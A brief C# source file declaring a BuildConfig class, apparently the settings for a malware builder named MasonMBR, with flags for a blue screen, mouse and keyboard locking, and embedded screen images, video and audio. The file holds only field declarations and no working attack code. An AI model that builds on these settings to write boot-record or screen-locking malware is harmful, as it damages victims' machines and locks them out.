namespace MasonMBR.Core
{
    class BuildConfig
    {
        internal static readonly byte[] _pipeSync = {
            0x0F,0x2E,0x6D,0x08,0x38,0x63,0x6F
        };

        internal bool     Bsod, Gdi, ImageMode;
        internal bool     LockMouse, LockKeyboard, ShowScreenImg, PlayVideo, PlayAudio;
        internal string   Text, GdiText, IconPath;
        internal byte[]   ImagePixels;
        internal byte[][] ImageFrames;
        internal int[]    FrameDelays;
        internal byte     TextFg, TextBg, ScrBg;
        internal byte[]   ScreenImgData;
        internal byte[]   VideoData;
        internal string   VideoExt;
        internal byte[]   AudioData;
        internal string   AudioExt;
    }
}
